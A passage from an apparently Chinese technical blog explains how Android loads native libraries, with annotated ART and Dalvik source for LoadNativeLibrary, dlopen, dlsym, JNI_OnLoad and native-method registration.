class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> JavaVMExt::LoadNativeLibrary(JNIEnv* env, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; path, jobject class_loader,</span><br><span class="line">                                  <span class="built_in">std</span>::<span class="built_in">string</span>* error_msg) &#123;</span><br><span class="line">  error_msg-&gt;clear();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// See if we've already loaded this library.  If we have, and the class loader</span></span><br><span class="line">  <span class="comment">// matches, return successfully without doing anything.</span></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> for better results we should canonicalize the pathname (or even compare</span></span><br><span class="line">  <span class="comment">// inodes). This implementation is fine if everybody is using System.loadLibrary.</span></span><br><span class="line">  SharedLibrary* library;</span><br><span class="line">  Thread* self = Thread::Current();</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> move the locking (and more of this logic) into Libraries.</span></span><br><span class="line">    <span class="function">MutexLock <span class="title">mu</span><span class="params">(self, *Locks::jni_libraries_lock_)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里的libraries_是一个LibraryList类，里面记录的是所有被Crazy Linker加载过的动态链接库</span></span><br><span class="line">    <span class="comment">// 在这里面查一查，如果有，那就说明已经被加载了。</span></span><br><span class="line">    library = libraries_-&gt;Get(path); </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// LibraryList中存在目标库</span></span><br><span class="line">  <span class="keyword">if</span> (library != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// 首先判断是否是由同一个Classloader加载的</span></span><br><span class="line">    <span class="comment">// 如果不是，返回异常。因为同一个so库只能被同一个classloader加载</span></span><br><span class="line">    <span class="keyword">if</span> (env-&gt;IsSameObject(library-&gt;GetClassLoader(), class_loader) == JNI_FALSE) &#123;</span><br><span class="line">      <span class="comment">// The library will be associated with class_loader. The JNI</span></span><br><span class="line">      <span class="comment">// spec says we can't load the same library into more than one</span></span><br><span class="line">      <span class="comment">// class loader.</span></span><br><span class="line">      StringAppendF(error_msg, <span class="string">"Shared library \"%s\" already opened by "</span></span><br><span class="line">          <span class="string">"ClassLoader %p; can't open in ClassLoader %p"</span>,</span><br><span class="line">          path.c_str(), library-&gt;GetClassLoader(), class_loader);</span><br><span class="line">      LOG(WARNING) &lt;&lt; error_msg;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 已经加载了这个so库，判断以前是否加载成功</span></span><br><span class="line">    <span class="comment">// 以前加载成功，返回true</span></span><br><span class="line">    <span class="comment">// 以前加载失败，返回false</span></span><br><span class="line">    VLOG(jni) &lt;&lt; <span class="string">"[Shared library \""</span> &lt;&lt; path &lt;&lt; <span class="string">"\" already loaded in "</span></span><br><span class="line">              &lt;&lt; <span class="string">" ClassLoader "</span> &lt;&lt; class_loader &lt;&lt; <span class="string">"]"</span>;</span><br><span class="line">    <span class="keyword">if</span> (!library-&gt;CheckOnLoadResult()) &#123;</span><br><span class="line">      StringAppendF(error_msg, <span class="string">"JNI_OnLoad failed on a previous attempt "</span></span><br><span class="line">          <span class="string">"to load \"%s\""</span>, path.c_str());</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the shared library.  Because we're using a full path, the system</span></span><br><span class="line">  <span class="comment">// doesn't have to search through LD_LIBRARY_PATH.  (It may do so to</span></span><br><span class="line">  <span class="comment">// resolve this library's dependencies though.)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Failures here are expected when java.library.path has several entries</span></span><br><span class="line">  <span class="comment">// and we have to hunt for the lib.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Below we dlopen but there is no paired dlclose, this would be necessary if we supported</span></span><br><span class="line">  <span class="comment">// class unloading. Libraries will only be unloaded when the reference count (incremented by</span></span><br><span class="line">  <span class="comment">// dlopen) becomes zero from dlclose.</span></span><br><span class="line"></span><br><span class="line">  Locks::mutator_lock_-&gt;AssertNotHeld(self);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 拿到so的全路径</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* path_str = path.empty() ? <span class="literal">nullptr</span> : path.c_str();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 使用dlopen打开目标库</span></span><br><span class="line">  <span class="comment">// dlopen的作用是将目标库加载进调用进程的虚拟地址空间并增加该库的打开引用计数</span></span><br><span class="line">  <span class="comment">// 它在成功时会返回一个句柄，后续对它的函数调用就可以直接使用该句柄了。</span></span><br><span class="line">  <span class="comment">// 如果发生错误，比如无法找到库，那么会返回NULL。</span></span><br><span class="line">  <span class="comment">// 如果目标库还依赖其他共享库，那么dlopen会自动加载那些库，如果有必要的话，这一过程会递归进行。</span></span><br><span class="line">  <span class="comment">// 加载进来的库也就呗称为这个库的依赖树。</span></span><br><span class="line">  <span class="comment">// 可以多次调用dlopen，但是库加载进内存的操作只会发生一次，所有的调用都返回相同的句柄值。</span></span><br><span class="line">  <span class="comment">// 但dloepn会为每次打开都维护一个引用计数，每次打开都会增加，关闭就会减少。</span></span><br><span class="line">  <span class="comment">// 当引用计数等于0时，就从内存中删掉这个库。</span></span><br><span class="line">  <span class="keyword">void</span>* handle = dlopen(path_str, RTLD_NOW);</span><br><span class="line">  <span class="keyword">bool</span> needs_native_bridge = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (handle == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果handle为空，也就意味着加载失败可</span></span><br><span class="line">    <span class="comment">// 这时候再判断该路径是否支持native bridge，</span></span><br><span class="line">    <span class="comment">// 如果支持，那么就再次尝试加载。也就是到java.library.path</span></span><br><span class="line">    <span class="keyword">if</span> (android::NativeBridgeIsSupported(path_str)) &#123;</span><br><span class="line">      handle = android::NativeBridgeLoadLibrary(path_str, RTLD_NOW);</span><br><span class="line">      needs_native_bridge = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  VLOG(jni) &lt;&lt; <span class="string">"[Call to dlopen(\""</span> &lt;&lt; path &lt;&lt; <span class="string">"\", RTLD_NOW) returned "</span> &lt;&lt; handle &lt;&lt; <span class="string">"]"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果经过上面两次加载，仍然为null，抛出异常</span></span><br><span class="line">  <span class="keyword">if</span> (handle == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    *error_msg = dlerror();</span><br><span class="line">    VLOG(jni) &lt;&lt; <span class="string">"dlopen(\""</span> &lt;&lt; path &lt;&lt; <span class="string">"\", RTLD_NOW) failed: "</span> &lt;&lt; *error_msg;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查打开的过程中是否存在异常</span></span><br><span class="line">  <span class="keyword">if</span> (env-&gt;ExceptionCheck() == JNI_TRUE) &#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"Unexpected exception:"</span>;</span><br><span class="line">    env-&gt;ExceptionDescribe();</span><br><span class="line">    env-&gt;ExceptionClear();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Create a new entry.</span></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> move the locking (and more of this logic) into Libraries.</span></span><br><span class="line">  <span class="keyword">bool</span> created_library = <span class="literal">false</span>;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Create SharedLibrary ahead of taking the libraries lock to maintain lock ordering.</span></span><br><span class="line">    <span class="comment">// 创建一个共享文件库Entry</span></span><br><span class="line">    <span class="comment">// 因为是多线程的，所以在这里需要判断我们创建的时候是否已经有其他线程先于我们创建了同一个共享文件库。</span></span><br><span class="line">    <span class="comment">// 如果有，那么这里的加载其实就是不必要的了(因为其他线程已经加载了这个库)。</span></span><br><span class="line">    <span class="comment">// 所以直接释放当前的资源即可，并调用CheckOnLoadResult</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;SharedLibrary&gt; new_library(</span><br><span class="line">        <span class="keyword">new</span> SharedLibrary(env, self, path, handle, class_loader));</span><br><span class="line">    <span class="function">MutexLock <span class="title">mu</span><span class="params">(self, *Locks::jni_libraries_lock_)</span></span>;</span><br><span class="line">    library = libraries_-&gt;Get(path);</span><br><span class="line">    <span class="keyword">if</span> (library == <span class="literal">nullptr</span>) &#123;  <span class="comment">// We won race to get libraries_lock.</span></span><br><span class="line">      library = new_library.release();</span><br><span class="line">      libraries_-&gt;Put(path, library);</span><br><span class="line">      created_library = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!created_library) &#123;</span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">"WOW: we lost a race to add shared library: "</span></span><br><span class="line">        &lt;&lt; <span class="string">"\""</span> &lt;&lt; path &lt;&lt; <span class="string">"\" ClassLoader="</span> &lt;&lt; class_loader;</span><br><span class="line">    <span class="keyword">return</span> library-&gt;CheckOnLoadResult();</span><br><span class="line">  &#125;</span><br><span class="line">  VLOG(jni) &lt;&lt; <span class="string">"[Added shared library \""</span> &lt;&lt; path &lt;&lt; <span class="string">"\" for ClassLoader "</span> &lt;&lt; class_loader &lt;&lt; <span class="string">"]"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 上面有两次加载so，所以这里需要通过标志位判断到底是用哪种方式加载的</span></span><br><span class="line">  <span class="comment">// 对于正常加载的流程来说，使用dlsym获取JNI_OnLoad的地址</span></span><br><span class="line">  <span class="keyword">bool</span> was_successful = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">void</span>* sym;</span><br><span class="line">  <span class="keyword">if</span> (needs_native_bridge) &#123;</span><br><span class="line">    library-&gt;SetNeedsNativeBridge();</span><br><span class="line">    sym = library-&gt;FindSymbolWithNativeBridge(<span class="string">"JNI_OnLoad"</span>, <span class="literal">nullptr</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    sym = dlsym(handle, <span class="string">"JNI_OnLoad"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (sym == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    VLOG(jni) &lt;&lt; <span class="string">"[No JNI_OnLoad found in \""</span> &lt;&lt; path &lt;&lt; <span class="string">"\"]"</span>;</span><br><span class="line">    was_successful = <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Call JNI_OnLoad.  We have to override the current class</span></span><br><span class="line">    <span class="comment">// loader, which will always be "null" since the stuff at the</span></span><br><span class="line">    <span class="comment">// top of the stack is around Runtime.loadLibrary().  (See</span></span><br><span class="line">    <span class="comment">// the comments in the JNI FindClass function.)</span></span><br><span class="line">    ScopedLocalRef&lt;jobject&gt; old_class_loader(env, env-&gt;NewLocalRef(self-&gt;GetClassLoaderOverride()));</span><br><span class="line">    self-&gt;SetClassLoaderOverride(class_loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取JNI的版本信息</span></span><br><span class="line">    VLOG(jni) &lt;&lt; <span class="string">"[Calling JNI_OnLoad in \""</span> &lt;&lt; path &lt;&lt; <span class="string">"\"]"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*JNI_OnLoadFn)</span><span class="params">(JavaVM*, <span class="keyword">void</span>*)</span></span>;</span><br><span class="line">    JNI_OnLoadFn jni_on_load = <span class="keyword">reinterpret_cast</span>&lt;JNI_OnLoadFn&gt;(sym);</span><br><span class="line">    <span class="keyword">int</span> version = (*jni_on_load)(<span class="keyword">this</span>, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (runtime_-&gt;GetTargetSdkVersion() != <span class="number">0</span> &amp;&amp; runtime_-&gt;GetTargetSdkVersion() &lt;= <span class="number">21</span>) &#123;</span><br><span class="line">      fault_manager.EnsureArtActionInFrontOfSignalChain();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    self-&gt;SetClassLoaderOverride(old_class_loader.get());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (version == JNI_ERR) &#123;</span><br><span class="line">      StringAppendF(error_msg, <span class="string">"JNI_ERR returned from JNI_OnLoad in \"%s\""</span>, path.c_str());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IsBadJniVersion(version)) &#123;</span><br><span class="line">      StringAppendF(error_msg, <span class="string">"Bad JNI version returned from JNI_OnLoad in \"%s\": %d"</span>,</span><br><span class="line">                    path.c_str(), version);</span><br><span class="line">      <span class="comment">// It's unwise to call dlclose() here, but we can mark it</span></span><br><span class="line">      <span class="comment">// as bad and ensure that future load attempts will fail.</span></span><br><span class="line">      <span class="comment">// We don't know how far JNI_OnLoad got, so there could</span></span><br><span class="line">      <span class="comment">// be some partially-initialized stuff accessible through</span></span><br><span class="line">      <span class="comment">// newly-registered native method calls.  We could try to</span></span><br><span class="line">      <span class="comment">// unregister them, but that doesn't seem worthwhile.</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      was_successful = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    VLOG(jni) &lt;&lt; <span class="string">"[Returned "</span> &lt;&lt; (was_successful ? <span class="string">"successfully"</span> : <span class="string">"failure"</span>)</span><br><span class="line">              &lt;&lt; <span class="string">" from JNI_OnLoad in \""</span> &lt;&lt; path &lt;&lt; <span class="string">"\"]"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  library-&gt;SetResult(was_successful);</span><br><span class="line">  <span class="keyword">return</span> was_successful;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dlopen-const-char-libfilename-int-flags"><a href="#dlopen-const-char-libfilename-int-flags" class="headerlink" title="dlopen(const char *libfilename, int flags)"></a>dlopen(const char *libfilename, int flags)</h2><p>dlopen的作用是将目标库加载进调用进程的虚拟地址空间并增加该库的打开引用计数，它在成功时会返回一个句柄，后续对它的函数调用就可以直接使用该句柄了。</p><p>如果发生错误，比如无法找到库，那么会返回NULL。</p><p>如果目标库还依赖其他共享库，那么dlopen会自动加载那些库，如果有必要的话，这一过程会递归进行。加载进来的库也就被称为这个库的依赖树。</p><p>可以多次调用dlopen，但是库加载进内存的操作只会发生一次，所有的调用都返回相同的句柄值。但dloepn会为每次打开都维护一个引用计数，每次打开都会增加，关闭就会减少。当引用计数等于0时，就从内存中删掉这个库（调用dlclose）。</p><p><strong>这里的源码太长（位置在bionic/linker/dlfcn.cpp），所以这里总结一下内容：</strong></p><p>触发dlopen时会做各种判断，包括flag是否正确、targetSDK是否匹配、so是否已加载等等。</p><p>然后根据传入的flag、name等参数构建一个soinfo对象（也就是ELF文件）。配置完基本信息后就加入到LoadTaskList中。</p><p>对于加载失败的so，例如现在需要连续加载test1和test2，但是1成功了，2失败了，也会卸载掉所有本次加载成功的so。</p><p>上述操作返回后（一个soinfo），判断so的构造方法是否已经被调用了，如果没有，则调用构造方法。递归加载所有子类的构造函数，然后再初始化本身。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bionic/linker/linker.cpp 中 void soinfo::call_constructors()</span></span><br><span class="line"></span><br><span class="line">get_children().for_each([] (soinfo* si) &#123;</span><br><span class="line">  si-&gt;call_constructors();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DT_INIT should be called before DT_INIT_ARRAY if both are present.</span></span><br><span class="line">call_function(<span class="string">"DT_INIT"</span>, init_func_); <span class="comment">// 调用init_func_这个函数</span></span><br><span class="line">call_array(<span class="string">"DT_INIT_ARRAY"</span>, init_array_, init_array_count_, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>然后设置其引用计数。也就是说，调用一次，引用计数就会加一。</p><h2 id="dlsym-void-handle-char-symbol"><a href="#dlsym-void-handle-char-symbol" class="headerlink" title="dlsym(void handle, char symbol)"></a>dlsym(void <em>handle, char </em>symbol)</h2><p>它会在handle指向的库以及该库的依赖树中搜索名为symbol的符号（函数或变量）。</p><p>如果找到了symbol，那么dlsym会返回其地址，否则返回NULL</p><h2 id="dlclose-void-handle"><a href="#dlclose-void-handle" class="headerlink" title="dlclose(void *handle)"></a>dlclose(void *handle)</h2><p>它会减少handle所引用的库的打开引用计数，如果这个引用计数变成了0并且其他库已经不再需要用到该库中的内容了，那么就会卸载这个库。对于这个库的依赖树而言，会递归执行。</p><h2 id="JNI-OnLoad相关"><a href="#JNI-OnLoad相关" class="headerlink" title="JNI_OnLoad相关"></a>JNI_OnLoad相关</h2><p>以下面的JNI_OnLoad的示例举例，位置在device/sample/frameworks/PlatformLibrary/jni/PlatformLibrary.cpp。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is called by the VM when the shared library is first loaded.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span> </span>&#123;</span><br><span class="line">    JNIEnv* env = <span class="literal">NULL</span>;</span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;GetEnv((<span class="keyword">void</span>**) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123;</span><br><span class="line">        ALOGE(<span class="string">"ERROR: GetEnv failed\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(env != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (registerMethods(env) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">"ERROR: PlatformLibrary native registration failed\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* success -- return valid version number */</span></span><br><span class="line">    result = JNI_VERSION_1_4;</span><br><span class="line"></span><br><span class="line">bail:</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用registerMethods显式注册本地方法，首先查找目标class，找到之后调用RegisterNatives根据传入的gmethods对象注册本地所有方法。gMethods对象包含java层的方法签名、java名、本地方法指针：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Explicitly register all methods for our class.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * While we're at it, cache some class references and method/field IDs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns 0 on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerMethods</span><span class="params">(JNIEnv* env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> kClassName =</span><br><span class="line">        <span class="string">"com/example/android/platform_library/PlatformLibrary"</span>;</span><br><span class="line">    jclass clazz;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* look up the class */</span></span><br><span class="line">    clazz = env-&gt;FindClass(kClassName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">"Can't find class %s\n"</span>, kClassName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* register all the methods */</span></span><br><span class="line">    <span class="keyword">if</span> (env-&gt;RegisterNatives(clazz, gMethods,</span><br><span class="line">            <span class="keyword">sizeof</span>(gMethods) / <span class="keyword">sizeof</span>(gMethods[<span class="number">0</span>])) != JNI_OK)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">"Failed registering methods for %s\n"</span>, kClassName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fill out the rest of the ID cache */</span></span><br><span class="line">    <span class="keyword">return</span> cacheIds(env, clazz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着就调用虚拟机中的RegisterNatives方法。遍历gMethods，依次注册。这部分代码摘自网络，Android源码里没找到，没有定位到Dalvik虚拟机那一层</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">dvmRegisterJNIMethod</span><span class="params">(ClassObject* clazz, <span class="keyword">const</span> <span class="keyword">char</span>* methodName,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* signature, <span class="keyword">void</span>* fnPtr)</span> </span>&#123;</span><br><span class="line">    Method* method = dvmFindDirectMethodByDescriptor(clazz, methodName, signature);</span><br><span class="line">    <span class="keyword">if</span> (method == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        method = dvmFindVirtualMethodByDescriptor(clazz, methodName, signature);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dvmUseJNIBridge(method, fnPtr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过函数名称和签名在指定的类中找到对应的Method，然后调用dvmUseJNIBridge为这个Method设置一个Bridge。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dvmUseJNIBridge</span><span class="params">(Method* method, <span class="keyword">void</span>* func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DalvikBridgeFunc bridge = shouldTrace(method)</span><br><span class="line">        ? dvmTraceCallJNIMethod</span><br><span class="line">        : dvmSelectJNIBridge(method);</span><br><span class="line">    dvmSetNativeFunc(method, bridge, func);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先获取一个DalvikBridgeFunc，然后再去调dvmSetNativeFunc。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dvmSetNativeFunc</span><span class="params">(Method* method, DalvikBridgeFunc func,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> u2* insns)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ClassObject* clazz = method-&gt;clazz;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (insns != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        method-&gt;insns = insns;</span><br><span class="line">        android_atomic_release_store((<span class="keyword">int32_t</span>) func,</span><br><span class="line">            (<span class="keyword">void</span>*) &amp;method-&gt;nativeFunc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        method-&gt;nativeFunc = func;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的函数指针赋给了insns，而nativeFunc设成了Bridge，为什么要这么做呢？解释器中执行到一个native函数时，调用的是其nativeFunc，也就是Bridge了，然后再调insns执行真正的函数。</p><p>再来看被动注册。在类加载过程中，会扫描类的各个函数，调用loadMethodFromDex加载函数。当发现是native时，会将其nativeFunc设为dvmResolveNativeMethod。当没有主动注册时，调到这个native函数就会执行到dvmResolveNativeMethod，否则就会执行到Bridge。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadMethodFromDex</span><span class="params">(ClassObject* clazz, <span class="keyword">const</span> DexMethod* pDexMethod,</span></span></span><br><span class="line"><span class="function"><span class="params">    Method* meth)</span> </span>&#123;</span><br><span class="line">    ..........</span><br><span class="line">    <span class="keyword">if</span> (dvmIsNativeMethod(meth)) &#123;</span><br><span class="line">        meth-&gt;nativeFunc = dvmResolveNativeMethod;</span><br><span class="line">        meth-&gt;jniArgInfo = computeJniArgInfo(&amp;meth-&gt;prototype);</span><br><span class="line">    &#125;</span><br><span class="line">    ..........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dvmResolveNativeMethod</span><span class="params">(<span class="keyword">const</span> u4* args, JValue* pResult,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> Method* method, Thread* self)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ClassObject* clazz = method-&gt;clazz;</span><br><span class="line">    <span class="keyword">void</span>* func;</span><br><span class="line"></span><br><span class="line">    ..........</span><br><span class="line"></span><br><span class="line">    func = lookupSharedLibMethod(method);</span><br><span class="line">    <span class="keyword">if</span> (func != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        dvmUseJNIBridge((Method*) method, func);</span><br><span class="line">        (*method-&gt;nativeFunc)(args, pResult, method, self);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span 